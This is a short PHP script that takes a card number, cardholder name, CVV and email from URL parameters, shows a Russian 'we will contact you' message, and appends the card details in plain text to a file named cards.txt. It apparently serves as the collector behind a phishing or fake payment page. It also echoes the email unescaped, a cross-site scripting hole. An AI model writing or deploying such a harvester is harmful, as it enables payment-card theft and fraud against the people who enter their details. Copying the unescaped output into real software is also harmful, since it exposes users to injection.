<?php
if(isset($_GET["num"]) and isset($_GET["name"]) and isset($_GET["cvs"]) and isset($_GET["mail"])){
  echo "мы с вами свяжемся: " . $_GET["mail"];
  $file = fopen("cards.txt", "a");
  fwrite($file, "card: " . $_GET["num"] . " name: " . $_GET["name"] . " cvs: " . $_GET["cvs"] . "\n");
  fclose($file);
}
else{
  echo "<h1>Ошибка:</h1> не все данные";
}
?>
<br><form action = '/'><input type = 'submit' value = 'OK'/></form>
